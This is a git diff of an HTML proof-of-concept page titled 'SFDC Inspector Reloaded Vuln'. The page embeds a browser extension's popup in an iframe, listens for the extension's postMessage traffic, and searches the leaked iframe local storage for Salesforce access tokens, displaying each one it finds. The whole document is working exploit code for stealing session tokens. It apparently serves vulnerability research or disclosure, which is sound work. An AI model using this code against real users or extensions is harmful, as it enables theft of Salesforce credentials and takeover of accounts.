@@ -1,41 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Extension Message Viewer</title>
+    <title>SFDC Inspector Reloaded Vuln</title>
     <style>
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
         #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; }
         pre { margin: 10px 0; white-space: pre-wrap; }
+        .token { color: #2e7d32; }
+        .message { color: #1976d2; }
     </style>
 </head>
 <body>
     <div id="messages"></div>
     <script>
-        function displayMessage(msg) {
+        function displayMessage(label, msg) {
             const pre = document.createElement('pre');
-            pre.textContent = typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg;
+            pre.textContent = `${label}:\n${typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg}`;
+            pre.className = label.includes('Token') ? 'token' : 'message';
             document.getElementById('messages').appendChild(pre);
         }
 
-        // Listen for messages from popup
         window.addEventListener('message', function(event) {
+            // Listen for all messages
             if (event.data.insextInitRequest) {
-                displayMessage('Init Request Message:');
-                displayMessage(event.data);
+                displayMessage('Init Request', event.data);
+                
+                // Also check for access tokens
+                const storage = event.data.iFrameLocalStorage;
+                for (let host in storage) {
+                    if (storage[host].includes('access_token')) {
+                        displayMessage('Access Token Found', `Host: ${host}\nStorage: ${storage[host]}`);
+                    }
+                }
             } else if (event.data.insextInitResponse) {
-                displayMessage('Init Response Message:');
-                displayMessage(event.data);
+                displayMessage('Init Response', event.data);
             } else if (event.data.insextLoaded) {
-                displayMessage('Extension Loaded');
+                displayMessage('Extension Status', 'Extension Loaded');
             } else if (event.data.insextShowStdPageDetails) {
-                displayMessage('Show Page Details:');
-                displayMessage(event.data);
+                displayMessage('Show Page Details', event.data);
+            } else if (event.data.insextUpdateRecordId) {
+                displayMessage('Record ID Update', event.data);
             }
         });
 
-        // Create hidden iframe to load popup
         const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
         iframe.src = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html`;
         document.body.appendChild(iframe);
     </script>
